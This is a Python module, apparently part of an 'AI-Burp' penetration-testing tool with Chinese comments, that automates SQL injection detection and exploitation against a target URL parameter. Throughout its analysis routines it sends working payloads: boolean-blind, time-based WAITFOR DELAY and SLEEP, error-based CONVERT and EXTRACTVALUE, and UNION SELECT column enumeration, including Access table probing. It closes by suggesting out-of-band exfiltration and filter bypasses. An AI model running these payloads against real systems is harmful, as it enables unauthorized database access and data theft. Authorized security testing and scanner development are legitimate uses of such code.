"""
AI-Burp 深度分析模块 v0.9.1

v0.9.1 改进:
- 识别 VBScript 类型转换错误 (800a000d)，避免误报
- 区分 SQL 错误 (80040e14) 和 VBScript 错误 (800a*)

v0.8.1 改进:
- 增强错误代码检测 (如 80040e14 vs 800a0bcd)
- 即使基线是 500 错误，也能检测注入
- 更严格的响应相似度判断

基于手工测试经验，增强对"可检测但难利用"场景的分析能力。

核心功能:
1. 响应指纹分析 - 识别统一异常处理
2. 多维度差异检测 - 状态码/大小/时间/内容/错误代码
3. 闭合方式精确识别
4. 数据库类型推断
5. 利用可行性评估
6. VBScript 错误识别 (避免误报)
"""

import time
import re
from dataclasses import dataclass, field
from typing import Dict, List, Tuple, Optional
from ..sync_wrapper import SyncBurp as Burp
from ..burp import Response


@dataclass
class ResponseFingerprint:
    """响应指纹"""
    status: int
    length: int
    time_ms: float
    content_hash: str  # 内容特征
    error_type: str = ""
    error_code: str = ""  # 新增: 具体错误代码 (如 80040e14)
    
    def __str__(self):
        err = f" [{self.error_code}]" if self.error_code else ""
        return f"[{self.status}] {self.length}b {self.time_ms:.0f}ms{err}"
    
    def similar_to(self, other: 'ResponseFingerprint', threshold: float = 0.1) -> bool:
        """
        判断两个响应是否相似
        
        v0.8.1 改进: 
        - 即使状态码相同，也检查响应大小差异
        - 检查错误代码变化
        """
        # 状态码不同 = 不相似
        if self.status != other.status:
            return False
        
        # 错误代码不同 = 不相似 (关键改进!)
        if self.error_code and other.error_code and self.error_code != other.error_code:
            return False
        
        # 响应大小差异检查
        if self.length == 0:
            return other.length == 0
        
        # 使用更严格的阈值 (5% 而不是 10%)
        size_diff = abs(self.length - other.length) / max(self.length, other.length)
        return size_diff < threshold


@dataclass 
class InjectionAnalysis:
    """注入分析结果"""
    # 基本信息
    url: str
    param: str
    method: str
    
    # 响应指纹
    baseline: ResponseFingerprint = None
    error_fingerprint: ResponseFingerprint = None
    
    # 检测结果
    injection_detected: bool = False
    injection_type: str = ""  # sqli, xss, ssti, etc.
    
    # 闭合方式
    quote_type: str = ""  # single, double, none, backtick
    comment_works: bool = False
    comment_type: str = ""  # --, #, /*, etc.
    
    # 数据库推断
    db_type: str = ""  # mssql, mysql, oracle, access, postgresql
    db_confidence: float = 0.0
    
    # 利用可行性
    exploitable: bool = False
    exploit_methods: List[str] = field(default_factory=list)
    blocking_factors: List[str] = field(default_factory=list)
    
    # 详细测试结果
    test_results: Dict[str, Dict] = field(default_factory=dict)
    
    def __str__(self):
        lines = [
            "=" * 60,
            f"🎯 注入分析报告: {self.url}",
            f"   参数: {self.param} ({self.method})",
            "=" * 60,
            "",
            f"📊 基线响应: {self.baseline}",
            f"📊 错误响应: {self.error_fingerprint}",
            "",
            f"🔍 注入检测: {'✅ 存在' if self.injection_detected else '❌ 未检测到'}",
        ]
        
        if self.injection_detected:
            lines.append(f"   类型: {self.injection_type}")
            lines.append(f"   引号: {self.quote_type or '未知'}")
            lines.append(f"   注释: {self.comment_type if self.comment_works else '不可用'}")
            lines.append(f"   数据库: {self.db_type or '未知'} (置信度: {self.db_confidence:.0%})")
            lines.append("")
            lines.append(f"💥 可利用性: {'✅ 可利用' if self.exploitable else '❌ 难以利用'}")
            
            if self.exploit_methods:
                lines.append(f"   可用方法: {', '.join(self.exploit_methods)}")
            
            if self.blocking_factors:
                lines.append(f"   阻碍因素: {', '.join(self.blocking_factors)}")
        
        lines.append("=" * 60)
        return "\n".join(lines)


class DeepAnalyzer:
    """
    深度分析器
    
    用法:
        analyzer = DeepAnalyzer(burp)
        result = analyzer.analyze("http://target.com/login", "username", "test", method="POST")
        print(result)
    """
    
    # 数据库特征
    DB_SIGNATURES = {
        'mssql': {
            'functions': ['@@version', 'GETDATE()', 'LEN()', 'CHARINDEX()', 'WAITFOR'],
            'errors': ['SQL Server', 'ODBC', 'OLE DB', 'Microsoft'],
            'concat': '+',
            'comment': '--',
        },
        'mysql': {
            'functions': ['VERSION()', 'NOW()', 'LENGTH()', 'SLEEP()', 'BENCHMARK('],
            'errors': ['MySQL', 'mysqli', 'mysql_'],
            'concat': 'CONCAT(',
            'comment': '-- ',  # MySQL 需要空格
        },
        'oracle': {
            'functions': ['SYSDATE', 'ROWNUM', 'DBMS_', 'UTL_'],
            'errors': ['ORA-', 'Oracle'],
            'concat': '||',
            'comment': '--',
        },
        'postgresql': {
            'functions': ['CURRENT_DATE', 'pg_sleep(', 'pg_'],
            'errors': ['PostgreSQL', 'pg_query'],
            'concat': '||',
            'comment': '--',
        },
        'access': {
            'functions': ['IIF(', 'DateValue('],
            'errors': ['JET', 'Access', "error '80040e14'"],
            'concat': '&',
            'comment': None,  # Access 不支持注释
        },
    }
    
    def __init__(self, burp: Burp):
        self.burp = burp
    
    def _get_fingerprint(self, r: Response) -> ResponseFingerprint:
        """生成响应指纹"""
        # 简单的内容哈希 (取前100字符)
        content_hash = hash(r.body[:100]) if r.body else ""
        
        # 提取错误代码 (如 80040e14, 800a0bcd, 800a000d 等)
        error_code = ""
        error_type = ""
        if r.body:
            import re
            code_match = re.search(r"error '([0-9a-fA-F]{8})'", r.body, re.I)
            if code_match:
                error_code = code_match.group(1).lower()
                # 识别错误类型
                if error_code == '80040e14':
                    error_type = "sql_jet"  # JET SQL 语法错误
                elif error_code == '800a0bcd':
                    error_type = "adodb"    # ADODB 错误
                elif error_code == '800a000d':
                    error_type = "vbscript_type"  # VBScript 类型转换错误 (非SQL注入!)
                elif error_code.startswith('800a'):
                    error_type = "vbscript"  # 其他 VBScript 错误
        
        return ResponseFingerprint(
            status=r.status,
            length=r.length,
            time_ms=r.time_ms,
            content_hash=str(content_hash),
            error_type=error_type,
            error_code=error_code
        )
    
    def _send(self, url: str, param: str, value: str, method: str) -> Response:
        """发送请求"""
        import urllib.parse
        if method.upper() == "GET":
            full_url = f"{url}?{param}={urllib.parse.quote(str(value))}"
            return self.burp.get(full_url)
        else:
            return self.burp.post(url, data={param: value})
    
    def analyze(
        self, 
        url: str, 
        param: str, 
        value: str, 
        method: str = "GET"
    ) -> InjectionAnalysis:
        """
        深度分析参数注入
        
        执行流程:
        1. 获取基线响应
        2. 测试基本注入字符
        3. 识别闭合方式
        4. 推断数据库类型
        5. 测试利用方法
        6. 评估可利用性
        """
        result = InjectionAnalysis(url=url, param=param, method=method)
        
        # 1. 基线测试 (多次取平均)
        print("📊 获取基线响应...")
        baselines = []
        for _ in range(3):
            r = self._send(url, param, value, method)
            baselines.append(self._get_fingerprint(r))
            time.sleep(self.burp.delay * 0.5)
        
        result.baseline = baselines[0]
        baseline_times = [b.time_ms for b in baselines]
        avg_time = sum(baseline_times) / len(baseline_times)
        
        # 2. 基本注入测试
        print("🔍 测试基本注入字符...")
        injection_chars = {
            "'": "single_quote",
            '"': "double_quote",
            "`": "backtick",
            "\\": "backslash",
            ";": "semicolon",
        }
        
        char_results = {}
        for char, name in injection_chars.items():
            r = self._send(url, param, f"{value}{char}", method)
            fp = self._get_fingerprint(r)
            char_results[name] = {
                'fingerprint': fp,
                'differs': not fp.similar_to(result.baseline),
                'response': r
            }
            time.sleep(self.burp.delay)
        
        result.test_results['chars'] = char_results
        
        # 检测是否有注入
        if char_results['single_quote']['differs']:
            result.injection_detected = True
            result.injection_type = "sqli"
            result.error_fingerprint = char_results['single_quote']['fingerprint']
            result.quote_type = "single"
        elif char_results['double_quote']['differs']:
            result.injection_detected = True
            result.injection_type = "sqli"
            result.error_fingerprint = char_results['double_quote']['fingerprint']
            result.quote_type = "double"
        
        # v0.9.1: 检查是否是 VBScript 类型转换错误 (误报)
        if result.injection_detected and result.error_fingerprint:
            if result.error_fingerprint.error_type == "vbscript_type":
                print("⚠️ 检测到 VBScript 类型转换错误 (cint/clng)，非 SQL 注入!")
                result.injection_detected = False
                result.injection_type = "vbscript_error"
                result.blocking_factors.append("VBScript cint() 类型转换错误，非 SQL 注入")
                return result
        
        if not result.injection_detected:
            print("❌ 未检测到注入")
            return result
        
        print(f"✅ 检测到注入 (引号类型: {result.quote_type})")
        
        # 3. 测试注释符
        print("🔍 测试注释符...")
        quote = "'" if result.quote_type == "single" else '"'
        comments = [
            ("--", "double_dash"),
            ("-- ", "double_dash_space"),
            ("#", "hash"),
            ("/*", "block_comment"),
            ("--+", "double_dash_plus"),
        ]
        
        comment_results = {}
        for comment, name in comments:
            payload = f"{value}{quote}{comment}"
            r = self._send(url, param, payload, method)
            fp = self._get_fingerprint(r)
            # 如果注释有效，响应应该接近基线
            works = fp.similar_to(result.baseline)
            comment_results[name] = {
                'fingerprint': fp,
                'works': works,
            }
            if works and not result.comment_works:
                result.comment_works = True
                result.comment_type = comment
            time.sleep(self.burp.delay)
        
        result.test_results['comments'] = comment_results
        
        # 4. 数据库类型推断
        print("🔍 推断数据库类型...")
        result.db_type, result.db_confidence = self._detect_db_type(
            url, param, value, method, result
        )
        
        # 5. 测试利用方法
        print("🔍 测试利用方法...")
        self._test_exploit_methods(url, param, value, method, result, avg_time)
        
        # 6. 评估可利用性
        self._assess_exploitability(result)
        
        return result
    
    def _detect_db_type(
        self, url: str, param: str, value: str, method: str, 
        result: InjectionAnalysis
    ) -> Tuple[str, float]:
        """推断数据库类型"""
        quote = "'" if result.quote_type == "single" else '"'
        scores = {db: 0.0 for db in self.DB_SIGNATURES}
        
        # 测试字符串拼接
        concat_tests = [
            (f"{value}{quote}+{quote}", "mssql"),
            (f"{value}{quote}||{quote}", "oracle"),
            (f"{value}{quote}||{quote}", "postgresql"),
            (f"{value}{quote} {quote}", "mysql"),  # 隐式拼接
            (f"{value}{quote}&{quote}", "access"),
        ]
        
        for payload, db in concat_tests:
            r = self._send(url, param, payload, method)
            fp = self._get_fingerprint(r)
            if fp.similar_to(result.baseline):
                scores[db] += 0.3
            time.sleep(self.burp.delay * 0.5)
        
        # 检查错误信息中的数据库特征
        error_body = result.test_results.get('chars', {}).get('single_quote', {}).get('response')
        if error_body:
            body_lower = error_body.body.lower()
            for db, sigs in self.DB_SIGNATURES.items():
                for err in sigs['errors']:
                    if err.lower() in body_lower:
                        scores[db] += 0.5
        
        # 找出最高分
        best_db = max(scores, key=scores.get)
        confidence = scores[best_db]
        
        return (best_db, confidence) if confidence > 0 else ("", 0.0)
    
    def _test_exploit_methods(
        self, url: str, param: str, value: str, method: str,
        result: InjectionAnalysis, baseline_time: float
    ):
        """测试各种利用方法"""
        quote = "'" if result.quote_type == "single" else '"'
        comment = result.comment_type or "--"
        
        exploit_tests = {}
        
        # 1. 布尔盲注
        print("   测试布尔盲注...")
        true_payload = f"{value}{quote} AND {quote}1{quote}={quote}1{comment}"
        false_payload = f"{value}{quote} AND {quote}1{quote}={quote}2{comment}"
        
        r_true = self._send(url, param, true_payload, method)
        time.sleep(self.burp.delay)
        r_false = self._send(url, param, false_payload, method)
        
        fp_true = self._get_fingerprint(r_true)
        fp_false = self._get_fingerprint(r_false)
        
        bool_works = not fp_true.similar_to(fp_false)
        exploit_tests['boolean_blind'] = {
            'works': bool_works,
            'true_response': fp_true,
            'false_response': fp_false,
            'diff': abs(fp_true.length - fp_false.length)
        }
        
        if bool_works:
            result.exploit_methods.append("布尔盲注")
        else:
            result.blocking_factors.append("布尔条件无差异响应")
        
        time.sleep(self.burp.delay)
        
        # 2. 时间盲注
        print("   测试时间盲注...")
        time_payloads = []
        if result.db_type == 'mssql':
            time_payloads = [
                f"{value}{quote}; WAITFOR DELAY '0:0:3'{comment}",
                f"{value}{quote} WAITFOR DELAY '0:0:3'{comment}",
            ]
        elif result.db_type == 'mysql':
            time_payloads = [
                f"{value}{quote} AND SLEEP(3){comment}",
                f"{value}{quote}; SELECT SLEEP(3){comment}",
            ]
        else:
            # 通用测试
            time_payloads = [
                f"{value}{quote}; WAITFOR DELAY '0:0:3'{comment}",
                f"{value}{quote} AND SLEEP(3){comment}",
            ]
        
        time_works = False
        for tp in time_payloads:
            r = self._send(url, param, tp, method)
            if r.time_ms > baseline_time + 2500:  # 2.5秒阈值
                time_works = True
                break
            time.sleep(self.burp.delay)
        
        exploit_tests['time_blind'] = {'works': time_works}
        
        if time_works:
            result.exploit_methods.append("时间盲注")
        else:
            result.blocking_factors.append("时间延迟无效")
        
        # 3. 报错注入
        print("   测试报错注入...")
        error_payloads = [
            f"{value}{quote} AND 1=CONVERT(int,@@version){comment}",
            f"{value}{quote} AND EXTRACTVALUE(1,CONCAT(0x7e,version())){comment}",
            f"{value}{quote} AND 1=1/0{comment}",
        ]
        
        error_works = False
        for ep in error_payloads:
            r = self._send(url, param, ep, method)
            # 检查是否有数据库错误信息泄露
            if r.error and r.error not in ['syntax']:
                error_works = True
                break
            # 检查响应中是否有版本信息等
            if re.search(r'(Microsoft|MySQL|Oracle|PostgreSQL|\d+\.\d+\.\d+)', r.body):
                error_works = True
                break
            time.sleep(self.burp.delay)
        
        exploit_tests['error_based'] = {'works': error_works}
        
        if error_works:
            result.exploit_methods.append("报错注入")
        else:
            result.blocking_factors.append("错误信息被过滤")
        
        # 4. UNION 注入
        print("   测试 UNION 注入...")
        union_works = False
        union_columns = 0
        
        # Access 数据库需要特殊处理 - 需要 FROM 子句
        if result.db_type == 'access':
            # Access: 尝试 ORDER BY 确定列数
            for cols in range(1, 20):
                payload = f"{value} ORDER BY {cols}"
                r = self._send(url, param, payload, method)
                fp = self._get_fingerprint(r)
                # 如果触发 80040e14 错误，说明列数是 cols-1
                if fp.error_code == '80040e14':
                    if cols > 1:
                        union_columns = cols - 1
                        print(f"      ORDER BY 确定列数: {union_columns}")
                        # 验证 UNION (使用数字而不是 NULL)
                        values = ','.join([str(i) for i in range(1, union_columns + 1)])
                        # 尝试不同的表
                        for table in ['users', 'products', 'orders', 'MSysObjects']:
                            union_payload = f"0 UNION SELECT {values} FROM {table}"
                            r2 = self._send(url, param, union_payload, method)
                            if r2.status == 200 and r2.length > result.baseline.length + 1000:
                                union_works = True
                                print(f"      UNION 成功! 表: {table}")
                                break
                            time.sleep(self.burp.delay * 0.3)
                    break
                time.sleep(self.burp.delay * 0.3)
        else:
            # 其他数据库: 使用 NULL
            for cols in range(1, 15):
                nulls = ','.join(['NULL'] * cols)
                payload = f"{value}{quote} UNION SELECT {nulls}{comment}"
                r = self._send(url, param, payload, method)
                fp = self._get_fingerprint(r)
                
                # 如果响应与错误响应不同，可能找到了正确的列数
                if not fp.similar_to(result.error_fingerprint):
                    union_works = True
                    union_columns = cols
                    break
                time.sleep(self.burp.delay * 0.5)
        
        exploit_tests['union'] = {
            'works': union_works,
            'columns': union_columns
        }
        
        if union_works:
            result.exploit_methods.append(f"UNION注入({union_columns}列)")
        else:
            result.blocking_factors.append("UNION查询无效")
        
        result.test_results['exploits'] = exploit_tests
    
    def _assess_exploitability(self, result: InjectionAnalysis):
        """评估可利用性"""
        # 如果有任何利用方法可用，则认为可利用
        result.exploitable = len(result.exploit_methods) > 0
        
        # 检查是否是"统一异常处理"场景
        if not result.exploitable and result.injection_detected:
            # 所有注入都返回相同的错误响应
            if result.error_fingerprint:
                result.blocking_factors.append("应用有统一异常处理")


def deep_analyze_command(burp: Burp, url: str, param: str, value: str, method: str = "GET") -> str:
    """深度分析命令入口"""
    analyzer = DeepAnalyzer(burp)
    result = analyzer.analyze(url, param, value, method)
    
    # 生成建议
    suggestions = []
    if result.injection_detected and not result.exploitable:
        suggestions.append("\n💡 建议:")
        suggestions.append("   1. 尝试 OOB 外带注入 (需要回调服务器如 interactsh)")
        suggestions.append("   2. 寻找其他没有异常处理的注入点")
        suggestions.append("   3. 测试二次注入 (注入存储后在其他页面触发)")
        suggestions.append("   4. 尝试更多绕过技术 (编码、注释变体等)")
        if result.db_type:
            suggestions.append(f"   5. 针对 {result.db_type} 数据库的特定技术")
    
    return str(result) + "\n".join(suggestions)
